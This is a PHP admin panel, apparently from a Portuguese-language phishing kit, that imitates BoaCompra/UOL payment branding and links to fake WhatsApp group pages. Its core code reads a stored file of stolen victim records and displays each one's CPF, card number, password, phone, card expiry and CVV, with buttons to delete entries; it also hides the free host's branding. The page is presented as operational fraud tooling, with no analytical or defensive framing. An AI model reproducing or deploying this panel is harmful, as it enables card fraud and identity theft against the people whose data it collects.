<?php

error_reporting(0);

session_start();
if (!isset($_SESSION['user']) || !isset($_SESSION['pass'])) {
	setcookie('msg','<center>Voce deve logar-se primeiro',time()+1);
	header('Location: login.php');
}

if (@$_GET['action'] == 'sair') {
	session_destroy();
	header('Location: login.php');
}

?>
		

<?php

	ini_set("display_errors",0);
error_reporting(0);


	$fl = "contador.json";
	if(file_exists($fl)){
		$h = fopen($fl, "r");
		$arr = json_decode(fread($h, filesize ($fl)));
		fclose($h);
		for($i = 0; $i < count($arr); $i++){
			$visitas = "".$arr[$i][0]."";
		}
	}
	?>
<html lang="en">
 <head> 
  <title>LUYZ ADMIN</title> 
  <meta charset="UTF-8">
  <meta name="robots" content="noindex"> 
  <meta name="theme-color" content="MediumBlue"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"> 
  <link rel="dns-prefetch" href="https://in.hotjar.com"> 
  <link rel="dns-prefetch" href="https://vars.hotjar.com"> 
  <link rel="dns-prefetch" href="https://script.hotjar.com"> 
  <link rel="dns-prefetch" href="https://static.hotjar.com"> 
  <link rel="dns-prefetch" href="https://me.jsuol.com.br"> 
  <link rel="dns-prefetch" href="https://api.boacompra.com"> 
  <link rel="dns-prefetch" href="//me.jsuol.com.br"> 
  <link rel="icon" href="https://payment.boacompra.com/statics//images/favicon.ico"> 
  <meta name="theme-color" content="red"> 
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <link href="css/signin.css" rel="stylesheet">   
    <script src="pjs/ie-emulation-modes-warning.js"></script>
  <link rel="stylesheet" href="dataCollect/tokenized.css"> 
  <script async src="https://me.jsuol.com.br/aud/boacompracheckout.js"></script>
  <script async src="https://static.hotjar.com/c/hotjar-596441.js"></script>
  <script async src="https://script.hotjar.com/modules.24670e88b088e10656d2.js" charset="utf-8"></script>
 
<style>
		h5,{
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:#d9524d;
					letter-spacing:-0.05;
					text-shadow:2px 1px 1px #666;
		}
		body{
		  background: url('img/pn.jpg') center center no-repeat fixed; 
		  -webkit-background-size: cover;
		  -moz-background-size: cover;
		  -o-background-size: cover;
		  background-size: cover;
		}
		h2 {
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:#28a745;
					letter-spacing:-0.05;
					text-shadow:1px 1px 1px 	#000;
		}
	img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {display:none;}
		</style>
   </head> 
 <body class="tudo"> 
<center>
<div> <table> < <td> <div> <td> <div> <a class="button" href="deslogar.php" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:DeepSkyBlue; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">DESLOGAR</a> <td> <div> <a class="button" href="usuarios.php" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:DeepSkyBlue; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">USUARIOS</a>
</div> </td> <<td> <div> <a class="button" href="lfzp.html" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:DeepSkyBlue; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">WHATSAPP CRIADOR</a>
</div> </td></tr>
</table> </div>
 <br>
<table>td> <div> <td> <div>
<a class="button" href="lfpwh.html" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:DeepSkyBlue; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">GRUPO WHATSAPP CRIADOR</a>
</div> </td></tr>
<table>
</table>
</center>
<center><div class="tokenized__wrapper tokenized__wrapper--form"> 
  <div class="tokenized__fields"> 
 <center>

	
          </div><br>
	<?php

	ini_set("display_errors",0);
error_reporting(0);


	$fl = "seguro/ccs.json";
	if(file_exists($fl)){
		$h = fopen($fl, "r");
		$arr = json_decode(fread($h, filesize ($fl)));
		fclose($h);
		for($i = 0; $i < count($arr); $i++){
			echo '<span style="color:red;">';
			echo "CPF: ".$arr[$i][0]."<br>CC: ".$arr[$i][1]."<br>SENHA: ".$arr[$i][2]."<br>FONE: ".$arr[$i][3]."<br>VALIDADE: ".$arr[$i][4]."<br>CVV: ".$arr[$i][5]."<br>";
			echo '<center><a href="apagar.php?apg='.$i.'"><button class="btn btn-info">APAGAR</button></a><hr></center>';
			echo '</span>';
		}
	}
	?>
	</div>
